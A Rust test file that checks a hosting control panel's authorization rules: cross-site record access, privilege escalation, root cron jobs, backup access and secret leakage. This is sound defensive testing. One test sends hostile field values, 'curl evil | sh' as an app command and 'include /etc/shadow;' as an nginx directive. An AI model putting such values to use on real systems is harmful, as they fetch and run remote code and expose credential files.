//! A signed-in site manager reaching for what isn't theirs: other sites' records through their own
//! site's URLs, fields they shouldn't be able to set, and jobs that run as someone else.

use super::*;
use crate::db::CronInput;
use serde_json::json;

#[tokio::test]
async fn nested_ids_must_belong_to_the_site_in_the_path() {
    let h = super::super::tests::harness();
    let mine = site_id(&h, "mine.example.com");
    let theirs = site_id(&h, "other.example.com");
    let (ssh_user, key) = {
        let conn = h.pool.get().unwrap();
        let u = db::create_ssh_user(&conn, theirs, "theiruser", false, false).unwrap();
        let k = db::add_ssh_key(&conn, u, "laptop", "ssh-ed25519 AAAAC3Nza theirs", "SHA256:theirs").unwrap();
        (u, k)
    };
    let auth_user = {
        let conn = h.pool.get().unwrap();
        db::upsert_basic_auth_user(&conn, theirs, "theirauth", "x").unwrap();
        db::list_basic_auth_users(&conn, theirs).unwrap()[0].id
    };
    let cookie = h.login("manager").await;
    let body = json!({"password": "Some-Password-123", "key": "ssh-ed25519 AAAA", "public_key": "ssh-ed25519 AAAA", "sftp_only": true, "label": "x", "name": "x"});
    for (method, path) in [
        ("PATCH", format!("/sites/{mine}/ssh-users/{ssh_user}")),
        ("DELETE", format!("/sites/{mine}/ssh-users/{ssh_user}")),
        ("POST", format!("/sites/{mine}/ssh-users/{ssh_user}/password")),
        ("POST", format!("/sites/{mine}/ssh-users/{ssh_user}/keys")),
        ("DELETE", format!("/sites/{mine}/ssh-users/{ssh_user}/keys/{key}")),
        ("DELETE", format!("/sites/{mine}/basic-auth/users/{auth_user}")),
    ] {
        let (s, v, _) = h.call(method, &path, Some(&cookie), Some(body.clone()), true).await;
        assert!(
            s == StatusCode::NOT_FOUND || s == StatusCode::BAD_REQUEST,
            "{method} {path}: {s} {v}"
        );
    }
    let conn = h.pool.get().unwrap();
    assert!(db::find_ssh_user(&conn, theirs, ssh_user).unwrap().is_some());
}

#[tokio::test]
async fn database_users_of_another_database_cannot_be_named() {
    let h = super::super::tests::harness();
    let (id, _) = managed_site_with_home(&h, "dbs.example.com");
    let db_id = {
        let conn = h.pool.get().unwrap();
        db::create_database(&conn, id, "sqlite", "mine").unwrap()
    };
    let cookie = h.login("manager").await;
    // A real account the panel doesn't list under this database, such as the server's own.
    // Reserved names stop at the name check, and any other is simply not on this database's list.
    for (name, want) in [
        ("root", StatusCode::BAD_REQUEST),
        ("mysql", StatusCode::BAD_REQUEST),
        ("someoneelse", StatusCode::NOT_FOUND),
    ] {
        let (s, _, _) = h
            .call(
                "DELETE",
                &format!("/databases/{db_id}/users/{name}"),
                Some(&cookie),
                None,
                true,
            )
            .await;
        assert_eq!(s, want, "{name}");
        let (s, _, _) = h
            .call(
                "POST",
                &format!("/databases/{db_id}/users/{name}/password"),
                Some(&cookie),
                Some(json!({})),
                true,
            )
            .await;
        assert_eq!(s, want, "{name}");
    }
}

#[tokio::test]
async fn a_site_manager_cannot_change_who_or_where_a_site_runs() {
    let h = super::super::tests::harness();
    let id = site_id(&h, "mine.example.com");
    let cookie = h.login("manager").await;
    let before = db::find_site_by_id(&h.pool.get().unwrap(), id).unwrap().unwrap();
    let (_, _, _) = h
        .call(
            "PATCH",
            &format!("/sites/{id}"),
            Some(&cookie),
            Some(json!({
                "system_user": "root", "home_dir": "/root", "domain": "other.example.com",
                "vhost_managed": false, "custom_directives": "include /etc/shadow;", "site_type": "static",
                "app_command": "curl evil | sh",
            })),
            true,
        )
        .await;
    let after = db::find_site_by_id(&h.pool.get().unwrap(), id).unwrap().unwrap();
    assert_eq!(after.system_user, before.system_user);
    assert_eq!(after.home_dir, before.home_dir);
    assert_eq!(after.domain, before.domain);
    assert_eq!(after.custom_directives, before.custom_directives);
    assert_eq!(after.site_type, before.site_type);
    assert_eq!(after.app_command, before.app_command);
}

#[tokio::test]
async fn nginx_directives_are_for_admins_only() {
    let h = super::super::tests::harness();
    let id = site_id(&h, "mine.example.com");
    let cookie = h.login("manager").await;
    let (s, _, _) = h
        .call(
            "PUT",
            &format!("/sites/{id}/directives"),
            Some(&cookie),
            Some(json!({"directives": "gzip on;", "custom_directives": "gzip on;"})),
            true,
        )
        .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
}

#[tokio::test]
async fn a_user_cannot_make_themselves_an_admin() {
    let h = super::super::tests::harness();
    let cookie = h.login("manager").await;
    let id = user_id(&h, "manager");
    let (s, _, _) = h
        .call(
            "PUT",
            &format!("/users/{id}"),
            Some(&cookie),
            Some(json!({"email": "m@example.com", "role": "admin"})),
            true,
        )
        .await;
    assert_eq!(s, StatusCode::FORBIDDEN);
    let (_, _, _) = h
        .call(
            "POST",
            "/auth/email",
            Some(&cookie),
            Some(json!({"email": "m2@example.com", "password": "admin-password-1", "role": "admin", "current_password": "admin-password-1"})),
            true,
        )
        .await;
    let role = db::find_user_by_id(&h.pool.get().unwrap(), id).unwrap().unwrap().role;
    assert_eq!(role, "site_manager");
}

#[tokio::test]
async fn a_new_user_cannot_be_given_a_role_that_does_not_exist() {
    let h = super::super::tests::harness();
    let cookie = h.login("admin").await;
    for role in ["root", "superadmin", "ADMIN", ""] {
        let (s, _, _) = h
            .call(
                "POST",
                "/users",
                Some(&cookie),
                Some(json!({"username": "newbie", "password": "A-Long-Password-1", "email": "n@example.com", "role": role})),
                true,
            )
            .await;
        assert_eq!(s, StatusCode::BAD_REQUEST, "{role:?}");
    }
}

#[tokio::test]
async fn the_last_admin_cannot_delete_themselves_out_of_the_panel() {
    let h = super::super::tests::harness();
    let cookie = h.login("admin").await;
    let id = user_id(&h, "admin");
    let (s, _, _) = h
        .call("DELETE", &format!("/users/{id}"), Some(&cookie), None, true)
        .await;
    assert_ne!(s, StatusCode::OK);
    assert!(db::find_user_by_id(&h.pool.get().unwrap(), id).unwrap().is_some());
}

// ---------- Cron ----------

fn cron_job(h: &Harness, site: Option<i64>, user: &str) -> i64 {
    let conn = h.pool.get().unwrap();
    db::create_cron_job(
        &conn,
        &CronInput {
            site_id: site,
            name: None,
            schedule: "* * * * *",
            command: "true",
            user,
            is_active: false,
        },
    )
    .unwrap()
}

/// Whatever is asked for, a manager's job runs as the site's user.
#[tokio::test]
async fn a_site_managers_cron_job_always_runs_as_the_site_user() {
    let h = super::super::tests::harness();
    let (id, _) = managed_site_with_home(&h, "cron.example.com");
    let cookie = h.login("manager").await;
    let (s, v, _) = h
        .call(
            "POST",
            "/cron/jobs",
            Some(&cookie),
            Some(json!({"site_id": id, "schedule": "* * * * *", "command": "id", "user": "root", "is_active": false})),
            true,
        )
        .await;
    if s == StatusCode::BAD_REQUEST && cfg!(windows) {
        return; // No /etc/passwd to look the user up in.
    }
    assert_eq!(s, StatusCode::CREATED, "{v}");
    let job = db::find_cron_job(&h.pool.get().unwrap(), v["id"].as_i64().unwrap())
        .unwrap()
        .unwrap();
    assert_eq!(job.user, current_user());
}

#[tokio::test]
async fn a_site_manager_cannot_make_a_job_that_belongs_to_no_site() {
    let h = super::super::tests::harness();
    let cookie = h.login("manager").await;
    let (s, _, _) = h
        .call(
            "POST",
            "/cron/jobs",
            Some(&cookie),
            Some(json!({"schedule": "* * * * *", "command": "id", "user": "root"})),
            true,
        )
        .await;
    assert_eq!(s, StatusCode::BAD_REQUEST);
}

/// An admin can link a job that runs as root to a site. That mustn't hand the site's manager a way
/// to run something as root and read what it printed.
#[tokio::test]
async fn sec11_a_site_manager_cannot_run_or_read_a_root_job_on_their_site() {
    let h = super::super::tests::harness();
    let (id, _) = managed_site_with_home(&h, "rootjob.example.com");
    let job = cron_job(&h, Some(id), "root");
    let cookie = h.login("manager").await;
    let (s, v, _) = h
        .call("POST", &format!("/cron/jobs/{job}/run"), Some(&cookie), None, true)
        .await;
    assert_eq!(s, StatusCode::NOT_FOUND, "ran a root job: {v}");
    let (s, _, _) = h
        .call("GET", &format!("/cron/jobs/{job}/runs"), Some(&cookie), None, false)
        .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, _, _) = h
        .call("DELETE", &format!("/cron/jobs/{job}"), Some(&cookie), None, true)
        .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
    let (s, v, _) = h.call("GET", "/cron/jobs", Some(&cookie), None, false).await;
    assert_eq!(s, StatusCode::OK);
    assert!(
        !v.as_array().unwrap().iter().any(|j| j["id"] == job),
        "listed a root job: {v}"
    );
}

/// `load` is the only thing between a manager and a job, so check the path from an update too.
#[tokio::test]
async fn sec11_a_site_manager_cannot_take_over_a_job_of_another_user_by_updating_it() {
    let h = super::super::tests::harness();
    let (id, _) = managed_site_with_home(&h, "takeover.example.com");
    let job = cron_job(&h, Some(id), "root");
    let cookie = h.login("manager").await;
    let (s, _, _) = h
        .call(
            "PUT",
            &format!("/cron/jobs/{job}"),
            Some(&cookie),
            Some(json!({"site_id": id, "schedule": "* * * * *", "command": "id", "is_active": false})),
            true,
        )
        .await;
    assert_eq!(s, StatusCode::NOT_FOUND);
}

#[tokio::test]
async fn a_job_belonging_to_nobody_is_only_visible_to_admins() {
    let h = super::super::tests::harness();
    let job = cron_job(&h, None, "root");
    let cookie = h.login("manager").await;
    let (_, v, _) = h.call("GET", "/cron/jobs", Some(&cookie), None, false).await;
    assert!(!v.as_array().unwrap().iter().any(|j| j["id"] == job));
    let admin = h.login("admin").await;
    let (_, v, _) = h.call("GET", "/cron/jobs", Some(&admin), None, false).await;
    assert!(v.as_array().unwrap().iter().any(|j| j["id"] == job));
}

// ---------- Jobs and backups ----------

#[tokio::test]
async fn a_user_only_sees_their_own_jobs() {
    let h = super::super::tests::harness();
    let (theirs, mine) = {
        let conn = h.pool.get().unwrap();
        let admin = db::find_user_by_username(&conn, "admin").unwrap().unwrap().id;
        let mgr = db::find_user_by_username(&conn, "manager").unwrap().unwrap().id;
        (
            db::create_job(&conn, "test", None, Some(admin)).unwrap(),
            db::create_job(&conn, "test", None, Some(mgr)).unwrap(),
        )
    };
    let cookie = h.login("manager").await;
    assert_eq!(
        h.call("GET", &format!("/jobs/{theirs}"), Some(&cookie), None, false)
            .await
            .0,
        StatusCode::NOT_FOUND
    );
    assert_eq!(
        h.call("GET", &format!("/jobs/{mine}"), Some(&cookie), None, false)
            .await
            .0,
        StatusCode::OK
    );
}

/// A panel backup holds everyone's data and the key to it.
#[tokio::test]
async fn panel_backups_cannot_be_reached_by_their_id() {
    let h = super::super::tests::harness();
    let id = {
        let conn = h.pool.get().unwrap();
        db::create_backup(&conn, None, "panel", "/nonexistent/panel.tar.gz").unwrap()
    };
    let cookie = h.login("manager").await;
    for (method, path) in [
        ("GET", format!("/backups/{id}/download")),
        ("POST", format!("/backups/{id}/restore")),
        ("DELETE", format!("/backups/{id}")),
    ] {
        let (s, _, _) = h.call(method, &path, Some(&cookie), None, true).await;
        assert!(
            s == StatusCode::NOT_FOUND || s == StatusCode::FORBIDDEN,
            "{method} {path}: {s}"
        );
    }
}

// ---------- What comes back ----------

#[tokio::test]
async fn secrets_never_appear_in_api_answers() {
    let h = super::super::tests::harness();
    {
        let conn = h.pool.get().unwrap();
        let id = db::find_user_by_username(&conn, "manager").unwrap().unwrap().id;
        db::set_totp_pending(&conn, id, "SUPERSECRETTOTPVALUE").unwrap();
        db::enable_totp(&conn, id, "[\"recovery-hash-value\"]").unwrap();
    }
    let admin = h.login("admin").await;
    for path in ["/users", "/auth/me", "/events", "/sites", "/jobs"] {
        let (s, v, _) = h.call("GET", path, Some(&admin), None, false).await;
        assert_eq!(s, StatusCode::OK, "{path}");
        let text = v.to_string();
        for secret in [
            "password_hash",
            "$argon2",
            "totp_secret",
            "SUPERSECRETTOTPVALUE",
            "\"recovery_codes\"",
            "recovery-hash-value",
            "token_version",
            "test-secret",
            "test-proxy-secret",
        ] {
            assert!(!text.contains(secret), "{path} contains {secret}: {text}");
        }
    }
}

/// An admin looking at a stored remote-backup config sees that one exists, not the key to it.
#[tokio::test]
async fn stored_s3_credentials_are_not_handed_back() {
    let h = super::super::tests::harness();
    let admin = h.login("admin").await;
    let (s, v, _) = h
        .call(
            "PUT",
            "/backups/remote",
            Some(&admin),
            Some(json!({
                "endpoint": "https://s3.example.com", "bucket": "b", "region": "us-east-1", "access_key": "AKIAEXAMPLE",
                "secret_key": "super-secret-key-value", "prefix": "x", "path_style": true,
            })),
            true,
        )
        .await;
    if s != StatusCode::OK {
        return; // Refused because the endpoint can't be reached is also fine for this purpose.
    }
    assert!(!v.to_string().contains("super-secret-key-value"), "{v}");
    let (_, v, _) = h.call("GET", "/backups/remote", Some(&admin), None, false).await;
    assert!(!v.to_string().contains("super-secret-key-value"), "{v}");
}
